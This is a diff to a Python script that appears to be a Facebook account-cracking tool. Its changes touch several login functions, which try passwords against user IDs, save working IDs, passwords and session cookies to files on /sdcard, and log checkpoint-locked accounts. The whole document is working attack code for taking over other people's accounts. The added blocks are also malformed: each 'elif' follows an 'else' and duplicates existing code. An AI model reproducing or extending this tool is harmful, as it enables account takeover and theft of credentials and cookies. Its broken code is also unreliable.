@@ -1460,7 +1460,7 @@ def x(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
+                    if "https://www.facebook.com/confirmemail.php?" in po or "confirmemail" in po:
                         print(f"{cyan}(ATOM-NV){cid}|{pw}")
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
@@ -1477,6 +1477,14 @@ def x(uid,pwx,tl):
                            break
                 else:
                     break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                 #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
@@ -1564,7 +1572,7 @@ def mobile(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
+                    if "https://www.facebook.com/confirmemail.php?" in po or "confirmemail" in po:
                         print(f"{cyan}(ATOM-NV){cid}|{pw}")
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
@@ -1581,6 +1589,14 @@ def mobile(uid,pwx,tl):
                            break
                 else:
                     break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                 #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
@@ -1673,7 +1689,7 @@ def freeq(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
+                    if "https://www.facebook.com/confirmemail.php?" in po or "confirmemail" in po:
                         print(f"{cyan}(ATOM-NV){cid}|{pw}")
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
@@ -1690,6 +1706,14 @@ def freeq(uid,pwx,tl):
                            break
                 else:
                     break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                 #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
@@ -1768,7 +1792,7 @@ def d(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
+                    if "https://www.facebook.com/confirmemail.php?" in po or "confirmemail" in po:
                         print(f"{cyan}(ATOM-NV){cid}|{pw}")
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
